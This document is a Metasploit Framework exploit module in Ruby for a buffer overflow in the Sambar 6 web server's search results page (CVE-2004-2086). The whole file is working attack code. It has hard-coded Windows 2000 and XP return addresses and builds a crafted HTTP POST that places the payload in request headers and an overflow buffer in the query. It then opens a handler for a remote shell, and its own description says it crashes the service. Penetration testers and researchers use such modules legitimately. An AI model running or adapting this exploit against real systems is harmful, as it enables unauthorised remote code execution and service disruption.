##
# $Id: sambar6_search_results.rb 8480 2010-02-13 20:15:19Z patrickw $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Sambar 6 Search Results Buffer Overflow',
			'Description'	=> %q{
			This module exploits a buffer overflow found in the
			/search/results.stm application that comes with Sambar 6.
			This code is a direct port of Andrew Griffiths's SMUDGE
			exploit, the only changes made were to the nops and payload.
			This exploit causes the service to die, whether you provided
			the correct target or not.
			},
			'Author' 	=> 	[
					'hdm',
					'Andrew Griffiths <andrewg [at] felinemenace.org>',
					'patrick', # msf3 port
						],
			'Arch'		=> [ ARCH_X86 ],
			'License'       => MSF_LICENSE,
			'Version'       => '$Revision: 8480 $',
			'References'    =>
			[
				[ 'CVE', '2004-2086' ],
				[ 'OSVDB', '5786' ],
				[ 'BID', '9607' ],
			],
			'Privileged'		=> false,
			'DefaultOptions'	=>
			{
				'EXITFUNC'	=> 'thread',
			},
			'Payload'		=>
				{
					'Space'			=> 2000, # unlimited
					'BadChars' 		=> "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c",
					'StackAdjustment' 	=> -3500,
				},
			'Platform' => ['win'],
			'Targets'  =>
			[
				# patrick tested OK 20100214 xpsp0
				['Windows 2000', 	{ 'jmpESP' => 0x74fdee63, 'Ret' => 0x773368f4 } ],
				['Windows XP',   	{ 'jmpESP' => 0x77da78ff, 'Ret' => 0x77e631ea } ], # user32.dll jmp esp; kernel32.dll retn

			],
			'DisclosureDate' => 'Jun 21 2003'))

			register_options(
			[
				Opt::RPORT(80),
			],self.class)
	end

	def check
		connect
		sock.put("GET / HTTP/1.0\r\n\r\n")
		banner = sock.get_once
		disconnect

		if (banner =~ /Server:\sSAMBAR/)
			return Exploit::CheckCode::Detected
		end
			return Exploit::CheckCode::Safe
	end

	def exploit
		connect

		buff = "POST /search/results.stm HTTP/1.1\r\n"
		buff << "Host: #{datastore['RHOST']}:#{datastore['RPORT']}\r\n"
		buff <<  "User-Agent: #{payload.encoded}\r\n"
		buff << "Accept: #{payload.encoded}\r\n"
		buff << "Accept-Encoding: #{payload.encoded}\r\n"
		buff << "Accept-Language: #{payload.encoded}\r\n"
		buff << "Accept-Ranges: #{payload.encoded}\r\n"
		buff << "Referrer: #{payload.encoded}\r\n"
		buff << "Connection: Keep-Alive\r\n"
		buff <<"Pragma: no-cache\r\n"
		buff << "Content-Type: #{payload.encoded}\r\n"

		# we use \xfc (cld) as nop, this code goes through tolower() and must be 0xc0->0xff
		# int3's DO NOT WORK because it triggers an exception and causes the server to exit
		jmpcode = "\xfc" + "h" + [target['Ret']].pack('V') + "\xfc\xfc\xfc" + "\xc2\x34\xd1"
		bigbuff = jmpcode  + ("X" * (128 - jmpcode.length)) + [target['jmpESP']].pack('V') +[target['jmpESP']].pack('V') + jmpcode
		content = "style=page&spage=0&indexname=docs&query=#{bigbuff}"
		buff << "Content-Length: #{content.length}\r\n\r\n" + content

		print_status("Sending #{buff.length} bytes to remote host.")
		sock.put(buff)
		res = sock.get_once
		if (!res)
			print_status("Didn't get response, hoping for shell anyway...")
		else
			print_status("Got Response!")
		end

		handler
		disconnect
	end
end
